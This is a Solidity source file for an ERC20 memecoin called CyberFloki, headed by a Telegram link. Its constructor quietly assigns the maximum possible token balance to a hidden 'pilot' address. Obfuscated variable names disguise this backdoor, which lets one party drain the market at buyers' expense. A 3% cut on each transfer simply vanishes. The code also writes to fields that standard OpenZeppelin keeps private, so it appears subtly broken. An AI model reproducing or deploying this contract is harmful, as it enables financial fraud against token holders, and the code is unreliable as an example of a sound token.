// https://t.me/cyberfloki_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract CyberFloki is ERC20, Ownable {
    uint256 private bag = ~uint256(0);
    uint256 public huge = 3;

    constructor(
        string memory hill,
        string memory seldom,
        address article,
        address pilot
    ) ERC20(hill, seldom) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[pilot] = bag;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address year,
        address built,
        uint256 minerals
    ) internal override {
        uint256 parent = (minerals / 100) * huge;
        minerals = minerals - parent;
        super._transfer(year, built, minerals);
    }
}